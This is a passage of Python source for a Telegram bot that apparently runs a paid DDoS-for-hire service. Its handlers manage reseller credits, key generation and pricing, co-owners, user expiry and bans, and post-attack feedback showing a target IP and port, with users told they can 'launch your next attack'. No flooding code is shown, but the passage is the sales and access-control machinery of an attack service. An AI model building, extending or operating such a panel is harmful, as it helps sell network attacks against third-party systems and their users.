            f"   {E['gear']}  Port  : {C(str(last.get('port','N/A')))}\n"
            f"   {E['user']}  UID   : {C(str(uid))}"
        )
        try: bot.send_photo(CHANNEL_ID, file_id, caption=cap, parse_mode='HTML')
        except: pass
        pending_feedback.pop(uid, None)
        bot.reply_to(message,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} FEEDBACK RECEIVED              ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['rocket']} You can now launch your next attack",
            parse_mode='HTML')
    else:
        pending_approval[uid] = {"file_id":file_id,
            "target":last.get('target','N/A'),"port":last.get('port','N/A'),
            "time":last.get('time','N/A')}
        bot.reply_to(message,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['warning']} LATE FEEDBACK                 ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['hourglass']} Submitted for admin review — wait for approval",
            parse_mode='HTML')
        try:
            cap = (
                f"╔══════════════════════════════════╗\n"
                f"║  {E['camera']} APPROVAL NEEDED               ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n"
                f"   {E['user']}  UID  : {C(str(uid))}\n"
                f"   {E['target']} IP   : {C(last.get('target','N/A'))}\n"
                f"   {E['gear']}  Port : {C(str(last.get('port','N/A')))}\n"
                f"\n"
                f"   {E['check']} /approvefb {uid}\n"
                f"   {E['cross']} /rejectfb {uid}"
            )
            bot.send_photo(int(OWNER_ID), file_id, caption=cap, parse_mode='HTML')
        except: pass

# ══════════════════════════════════════════════
# 💰 RESELLER COMMANDS
# ══════════════════════════════════════════════
@bot.message_handler(commands=['balance'])
def balance_cmd(message):
    if not pre_check(message): return
    uid = message.from_user.id
    if not is_reseller(uid) and not is_admin(uid):
        bot.send_message(message.chat.id, f"{E['noentry']} Reseller access required", parse_mode='HTML'); return
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['moneybag']} BALANCE                       ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"   {E['money']}  Credits : {B(str(get_balance(uid)))}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML')

@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    if not pre_check(message): return
    uid = message.from_user.id
    if not is_reseller(uid) and not is_admin(uid):
        bot.send_message(message.chat.id, f"{E['noentry']} Reseller access required", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['key']} GENERATE KEY                  ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['arrow']} Usage  : /genkey TYPE COUNT\n"
            f"   {E['lightbulb']} Types  : 12h 24h 1d 2d … 30d\n"
            f"   {E['arrow']} Example: {C('/genkey 7d 3')}",
            parse_mode='HTML'); return
    ktype = args[1].lower()
    cnt   = int(args[2]) if args[2].isdigit() else 0
    if cnt < 1 or cnt > 50:
        bot.send_message(message.chat.id, f"{E['noentry']} Count must be 1–50", parse_mode='HTML'); return
    keys, err = gen_keys_reseller(uid, ktype, cnt)
    if err:
        bot.send_message(message.chat.id, err, parse_mode='HTML'); return
    option = RESELLER_KEY_OPTIONS[ktype]
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['check']} KEYS GENERATED                ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"   {E['hourglass']} Duration   : {B(str(option['hours']))} hours\n"
        f"   {E['moneybag']}  Total Cost : {B(str(option['credits']*cnt))} credits\n"
        f"   {E['gem2']}   Count      : {B(str(cnt))}\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['key']} {B('Keys:')}\n" + "\n".join([C(k) for k in keys]),
        parse_mode='HTML')

@bot.message_handler(commands=['mykeys'])
def mykeys_cmd(message):
    if not pre_check(message): return
    uid = str(message.from_user.id)
    if not is_reseller(uid) and not is_admin(int(uid)):
        bot.send_message(message.chat.id, f"{E['noentry']} Reseller access required", parse_mode='HTML'); return
    kd      = load(KEYS_FILE, {"used":{},"unused":{}})
    my_keys = [k for k,v in kd["unused"].items() if str(v.get("generated_by","")) == uid]
    if not my_keys:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['cross']} NO KEYS FOUND                 ║\n"
            f"╚══════════════════════════════════╝",
            parse_mode='HTML'); return
    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['key']} MY KEYS ({len(my_keys)})               ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for k in my_keys[:20]:
        v       = kd["unused"][k]
        hours   = v['duration']
        display = f"{hours//24}d" if hours >= 24 else f"{hours}h"
        used    = v.get('redeemed_count',0)
        maxu    = v.get('max_users',1)
        lines.append(f"   {E['key']} {C(k)}")
        lines.append(f"         {E['hourglass']} {display}  |  {used}/{maxu} used")
    if len(my_keys) > 20:
        lines.append(f"\n   {E['arrow']} … and {len(my_keys)-20} more")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

@bot.message_handler(commands=['reseller_panel'])
def reseller_panel_cmd(message):
    if not pre_check(message): return
    uid = str(message.from_user.id)
    if not is_reseller(uid) and not is_admin(int(uid)):
        bot.send_message(message.chat.id, f"{E['noentry']} Reseller access required", parse_mode='HTML'); return
    kd      = load(KEYS_FILE, {"used":{},"unused":{}})
    my_keys = [k for k,v in kd["unused"].items() if str(v.get("generated_by","")) == uid]
    lines   = [
        f"╔══════════════════════════════════╗",
        f"║  {E['handshake']} RESELLER DASHBOARD            ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   {E['moneybag']}  Balance    : {B(str(get_balance(uid)))} credits",
        f"   {E['key']}   Active keys : {B(str(len(my_keys)))}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"",
        f"   {E['gem']} {B('Key Pricing (per key):')}",
        f"   ─────────────────────────────",
    ]
    for k, v in list(RESELLER_KEY_OPTIONS.items())[:15]:
        lines.append(f"   {C(k):8} ›  {v['credits']} credits  ({v['hours']}h)")
    lines += [
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"",
        f"   {E['arrow']} /genkey TYPE COUNT  ›  Generate keys",
        f"   {E['clipboard']} /mykeys             ›  Your inventory",
        f"   {E['moneybag']}  /balance            ›  Check credits",
    ]
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

# ══════════════════════════════════════════════
# 👑 CO-OWNER COMMANDS
# ══════════════════════════════════════════════
@bot.message_handler(commands=['addcoowner'])
def addcoowner_cmd(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.send_message(message.chat.id, f"{E['noentry']} Owner only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /addcoowner USER_ID", parse_mode='HTML'); return
    co = co_owners()
    if args[1] not in co:
        co.append(args[1]); save_co_owners(co)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['trophy']} CO-OWNER ADDED                ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['id']} User ID : {C(args[1])}",
            parse_mode='HTML')
        try:
            bot.send_message(int(args[1]),
                f"╔══════════════════════════════════╗\n"
                f"║  {E['crown2']} YOU ARE NOW CO-OWNER          ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['star2']} Full admin access granted\n"
                f"{E['clipboard']} Use /help to see all commands",
                parse_mode='HTML')
        except: pass
    else:
        bot.send_message(message.chat.id, f"{E['warning']} Already a co-owner", parse_mode='HTML')

@bot.message_handler(commands=['removecoowner'])
def removecoowner_cmd(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.send_message(message.chat.id, f"{E['noentry']} Owner only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /removecoowner USER_ID", parse_mode='HTML'); return
    co = co_owners()
    if args[1] in co:
        co.remove(args[1]); save_co_owners(co)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['cross']} CO-OWNER REMOVED               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['id']} User ID : {C(args[1])}",
            parse_mode='HTML')
        try:
            bot.send_message(int(args[1]),
                f"╔══════════════════════════════════╗\n"
                f"║  {E['cross']} CO-OWNER STATUS REMOVED       ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['bell']} Contact owner for more info",
                parse_mode='HTML')
        except: pass
    else:
        bot.send_message(message.chat.id, f"{E['cross']} Not found in co-owner list", parse_mode='HTML')

@bot.message_handler(commands=['coowners'])
def coowners_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    co = co_owners()
    if not co:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['people']} CO-OWNERS                     ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['cross']} No co-owners set",
            parse_mode='HTML'); return
    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['crown2']} CO-OWNERS ({len(co)})                ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for u in co: lines.append(f"   {E['crown']} {C(u)}")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

# ══════════════════════════════════════════════
# 🔑 KEY COMMANDS — ADMIN
# ══════════════════════════════════════════════
@bot.message_handler(commands=['genadmin'])
def genadmin_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 5:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['key']} GENERATE ADMIN KEY            ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['arrow']} Usage  : /genadmin PREFIX DUR UNIT COUNT\n"
            f"   {E['lightbulb']} Units  : min / hour / day\n"
            f"   {E['arrow']} Example: {C('/genadmin VIP 7 day 10')}",
            parse_mode='HTML'); return
    try: dur, unit, cnt = int(args[2]), args[3].lower(), int(args[4])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid parameters", parse_mode='HTML'); return
    if unit not in ("min","hour","day"):
        bot.send_message(message.chat.id, f"{E['noentry']} Unit must be: min / hour / day", parse_mode='HTML'); return
    keys = gen_keys_admin(args[1], dur, unit, cnt)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['check']} KEYS GENERATED                ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"   {E['hourglass']} Duration : {B(str(dur))} {unit}\n"
        f"   {E['gem2']}   Count    : {B(str(cnt))}\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['key']} {B('Keys:')}\n" + "\n".join([C(k) for k in keys]),
        parse_mode='HTML')

@bot.message_handler(commands=['gentrial'])
def gentrial_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) < 5:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['gift']} GENERATE TRIAL KEY            ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['arrow']} Usage  : /gentrial PREFIX DUR UNIT COUNT [MAX]\n"
            f"   {E['arrow']} Example: {C('/gentrial FREE 1 day 5 1')}",
            parse_mode='HTML'); return
    try: dur, unit, cnt = int(args[2]), args[3].lower(), int(args[4])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid parameters", parse_mode='HTML'); return
    mx = int(args[5]) if len(args) > 5 and args[5].isdigit() else 1
    if unit not in ("min","hour","day"):
        bot.send_message(message.chat.id, f"{E['noentry']} Unit must be: min / hour / day", parse_mode='HTML'); return
    keys = gen_trial_keys_admin(args[1], dur, unit, cnt, mx)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['gift']} TRIAL KEYS GENERATED          ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"   {E['hourglass']} Duration  : {B(str(dur))} {unit}\n"
        f"   {E['people']}   Max users : {B(str(mx))} per key\n"
        f"   {E['gem2']}   Count     : {B(str(cnt))}\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['key']} {B('Keys:')}\n" + "\n".join([C(k) for k in keys]),
        parse_mode='HTML')

@bot.message_handler(commands=['deletetrialkeys'])
def deletetrialkeys_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    delete_all_trial_keys()
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['check']} TRIAL KEYS DELETED            ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n{E['skull']} All trial keys deleted and trial users revoked",
        parse_mode='HTML')

@bot.message_handler(commands=['allkeys'])
def allkeys_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    kd    = load(KEYS_FILE, {"used":{},"unused":{}})
    users = load(USER_FILE, {})
    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['key']} ALL KEYS                       ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   {E['green']} {B('Unused')} ({len(kd['unused'])})",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for k,v in list(kd["unused"].items())[:10]:
        lines.append(f"   {C(k)}")
        lines.append(f"   {E['hourglass']} {v['duration']}{v['unit']}")
    if not kd["unused"]: lines.append(f"   {E['cross']} None")
    lines += [
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   {E['red']} {B('Used')} ({len(kd['used'])})",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for k,v in list(kd["used"].items())[:10]:
        ub    = v.get('used_by','?')
        uname = users.get(str(ub), {}).get('username','?')
        lines.append(f"   {C(k)}")
        lines.append(f"   {E['user']} {C(str(ub))} @{uname}")
    if not kd["used"]: lines.append(f"   {E['cross']} None")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

@bot.message_handler(commands=['removekey'])
def removekey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /removekey KEY", parse_mode='HTML'); return
    key = args[1]; kd = load(KEYS_FILE, {"used":{},"unused":{}})
    if key in kd["unused"]:
        del kd["unused"][key]; save(KEYS_FILE, kd)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} KEY REMOVED                   ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['green']} Status: was unused",
            parse_mode='HTML')
    elif key in kd["used"]:
        uid_val = kd["used"][key].get("used_by")
        if uid_val:
            us = load(USER_FILE, {})
            if str(uid_val) in us: del us[str(uid_val)]; save(USER_FILE, us)
        del kd["used"][key]; save(KEYS_FILE, kd)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} KEY REMOVED                   ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['user']} User {C(str(uid_val))} revoked",
            parse_mode='HTML')
        try:
            bot.send_message(int(uid_val),
                f"╔══════════════════════════════════╗\n"
                f"║  {E['cross']} KEY REVOKED                   ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['bell']} Your key has been removed by admin\n"
                f"{E['key']} Contact admin for a new plan",
                parse_mode='HTML')
        except: pass
    else:
        bot.send_message(message.chat.id, f"{E['cross']} Key not found", parse_mode='HTML')

@bot.message_handler(commands=['keyinfo'])
def keyinfo_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /keyinfo KEY", parse_mode='HTML'); return
    key = args[1]; kd = load(KEYS_FILE, {"used":{},"unused":{}})
    if key in kd["unused"]:
        v = kd["unused"][key]
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['key']} KEY INFO                      ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {C(key)}\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   {E['green']} Status     : Unused\n"
            f"   {E['hourglass']} Duration   : {v['duration']} {v['unit']}\n"
            f"   {E['people']}   Max users  : {v.get('max_users',1)}\n"
            f"   {E['calendar']} Generated  : {v.get('generated','N/A')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode='HTML')
    elif key in kd["used"]:
        v = kd["used"][key]; ub = v.get('used_by','?')
        us = load(USER_FILE, {})
        uname = us.get(str(ub), {}).get('username','?')
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['key']} KEY INFO                      ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {C(key)}\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   {E['red']}  Status    : Used\n"
            f"   {E['hourglass']} Duration   : {v['duration']} {v['unit']}\n"
            f"   {E['user']}   Used by   : {C(str(ub))} @{uname}\n"
            f"   {E['calendar']} Used at   : {v.get('used_at','N/A')}\n"
            f"   {E['clock']}   Expiry    : {v.get('expiry','N/A')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, f"{E['cross']} Key not found", parse_mode='HTML')

@bot.message_handler(commands=['inkey'])
def inkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, f"{E['noentry']} /inkey KEY AMOUNT", parse_mode='HTML'); return
    try: amt = int(args[2])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid amount", parse_mode='HTML'); return
    if increase_key_duration(args[1], amt):
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} KEY EXTENDED                  ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['hourglass']} +{B(str(amt))} hours → {C(args[1])}",
            parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, f"{E['cross']} Key not found", parse_mode='HTML')

@bot.message_handler(commands=['removeinkey'])
def removeinkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, f"{E['noentry']} /removeinkey KEY AMOUNT", parse_mode='HTML'); return
    try: amt = int(args[2])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid amount", parse_mode='HTML'); return
    if decrease_key_duration(args[1], amt):
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} KEY REDUCED                   ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['hourglass']} -{B(str(amt))} hours → {C(args[1])}",
            parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, f"{E['cross']} Key not found", parse_mode='HTML')

@bot.message_handler(commands=['inallkey'])
def inallkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /inallkey AMOUNT", parse_mode='HTML'); return
    try: amt = int(args[1])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid amount", parse_mode='HTML'); return
    count = increase_all_keys(amt)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['check']} ALL KEYS EXTENDED             ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n{E['hourglass']} +{B(str(amt))} hours → {B(str(count))} keys",
        parse_mode='HTML')

@bot.message_handler(commands=['allremoveinkey'])
def allremoveinkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /allremoveinkey AMOUNT", parse_mode='HTML'); return
    try: amt = int(args[1])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid amount", parse_mode='HTML'); return
    count = decrease_all_keys(amt)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['check']} ALL KEYS REDUCED              ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n{E['hourglass']} -{B(str(amt))} hours → {B(str(count))} keys",
        parse_mode='HTML')

# ══════════════════════════════════════════════
# 👥 USER MANAGEMENT
# ══════════════════════════════════════════════
@bot.message_handler(commands=['users'])
def users_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    users = load(USER_FILE, {})
    if not users:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['people']} USERS                         ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['cross']} No users yet",
            parse_mode='HTML'); return
    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['people']} USERS ({len(users)})                  ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    ]
    for uid, info in list(users.items())[:30]:
        uname = info.get('username','?')
        if info.get("banned"):
            status = f"{E['lock']} BANNED"
        else:
            try:
                expiry = datetime.datetime.fromisoformat(info["expiry"])
                if datetime.datetime.now() > expiry:
                    status = f"{E['red']} EXPIRED"
                else:
                    rem    = expiry - datetime.datetime.now()
                    status = f"{E['green']} {rem.days}d {rem.seconds//3600}h"
            except: status = f"{E['warning']} ERROR"
        ptype = "Trial" if info.get("trial") else "Paid"
        lines.append(f"   {E['user']} {C(uid)} @{uname}")
        lines.append(f"         {status} [{ptype}]")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

@bot.message_handler(commands=['removeuser'])
def removeuser_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /removeuser USER_ID", parse_mode='HTML'); return
    if remove_user_key(args[1]):
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} USER REMOVED                  ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['id']} ID: {C(args[1])}",
            parse_mode='HTML')
        try:
            bot.send_message(int(args[1]),
                f"╔══════════════════════════════════╗\n"
                f"║  {E['cross']} ACCOUNT REMOVED               ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['bell']} Your account has been removed by admin\n"
                f"{E['key']} Contact admin to get a new plan",
                parse_mode='HTML')
        except: pass
    else:
        bot.send_message(message.chat.id, f"{E['cross']} User not found", parse_mode='HTML')

@bot.message_handler(commands=['revoke'])
def revoke_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) < 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /revoke USER_ID [S|L]  (S=silent, L=notify)", parse_mode='HTML'); return
    target = args[1]; mode = args[2].upper() if len(args)>=3 and args[2].upper() in ['S','L'] else 'S'
    users  = load(USER_FILE, {})
    if str(target) not in users:
        bot.send_message(message.chat.id, f"{E['cross']} User not found", parse_mode='HTML'); return
    key = users[str(target)].get("key")
    remove_user_key(target)
    if mode == 'L':
        try:
            bot.send_message(int(target),
                f"╔══════════════════════════════════╗\n"
                f"║  {E['noentry']} PLAN REVOKED                  ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n"
                f"   {E['key']}  Key revoked by admin\n"
                f"   {E['lightbulb']} Contact admin for a new plan",
                parse_mode='HTML')
        except: pass
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} REVOKED — USER NOTIFIED       ║\n"
            f"╚══════════════════════════════════╝",
            parse_mode='HTML')
    else:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} REVOKED SILENTLY               ║\n"
            f"╚══════════════════════════════════╝",
            parse_mode='HTML')

@bot.message_handler(commands=['extenduser'])
def extenduser_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, f"{E['noentry']} /extenduser USER_ID DAYS", parse_mode='HTML'); return
    try: days = int(args[2])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid days", parse_mode='HTML'); return
    users = load(USER_FILE, {})
    if args[1] not in users:
        bot.send_message(message.chat.id, f"{E['cross']} User not found", parse_mode='HTML'); return
    try:
        cur = datetime.datetime.fromisoformat(users[args[1]]["expiry"])
        new = cur + datetime.timedelta(days=days)
        users[args[1]]["expiry"] = new.isoformat(); save(USER_FILE, users)
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['calendar']} USER EXTENDED                 ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['id']}   ID      : {C(args[1])}\n"
            f"   {E['hourglass']} Added   : +{B(str(days))} days\n"
            f"   {E['calendar']} Expires : {C(new.strftime('%Y-%m-%d %H:%M:%S'))}",
            parse_mode='HTML')
        try:
            bot.send_message(int(args[1]),
                f"╔══════════════════════════════════╗\n"
                f"║  {E['gift']} PLAN EXTENDED                 ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n"
                f"   {E['calendar']} +{days} day(s) added to your plan\n"
                f"   {E['hourglass']} New expiry: {C(new.strftime('%Y-%m-%d %H:%M:%S'))}",
                parse_mode='HTML')
        except: pass
    except:
        bot.send_message(message.chat.id, f"{E['warning']} Error extending — check user expiry data", parse_mode='HTML')

@bot.message_handler(commands=['extendusers'])
def extendusers_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id,
            f"{E['noentry']} /extendusers DUR UNIT\n{E['arrow']} Example: /extendusers 7 day",
            parse_mode='HTML'); return
    try: dur, unit = int(args[1]), args[2].lower()
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Invalid parameters", parse_mode='HTML'); return
    cnt = extend_all_users(dur, unit)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['calendar']} ALL USERS EXTENDED            ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n{E['people']} {B(str(cnt))} users extended by {B(str(dur))} {unit}",
        parse_mode='HTML')

@bot.message_handler(commands=['ban'])
def ban_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) < 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /ban USER_ID REASON", parse_mode='HTML'); return
    target = args[1]; reason = " ".join(args[2:]) if len(args)>2 else "No reason given"
    banned = load(BANNED_FILE, {})
    banned[target] = {"banned_at":datetime.datetime.now().isoformat(),"reason":reason}
    save(BANNED_FILE, banned)
    us = load(USER_FILE, {})
    if target in us: us[target]["banned"] = True; save(USER_FILE, us)
    bot.send_message(message.chat.id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['lock']} USER BANNED                   ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"   {E['id']}        ID     : {C(target)}\n"
        f"   {E['clipboard']} Reason : {reason}",
        parse_mode='HTML')
    try:
        bot.send_message(int(target),
            f"╔══════════════════════════════════╗\n"
            f"║  {E['lock']} YOU HAVE BEEN BANNED          ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['clipboard']} Reason : {reason}\n"
            f"   {E['bell']}     Contact admin for unban",
            parse_mode='HTML')
    except: pass

@bot.message_handler(commands=['unban'])
def unban_cmd(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, f"{E['noentry']} Admin only", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, f"{E['noentry']} /unban USER_ID", parse_mode='HTML'); return
    banned = load(BANNED_FILE, {})
    if args[1] in banned:
        del banned[args[1]]; save(BANNED_FILE, banned)
        us = load(USER_FILE, {})
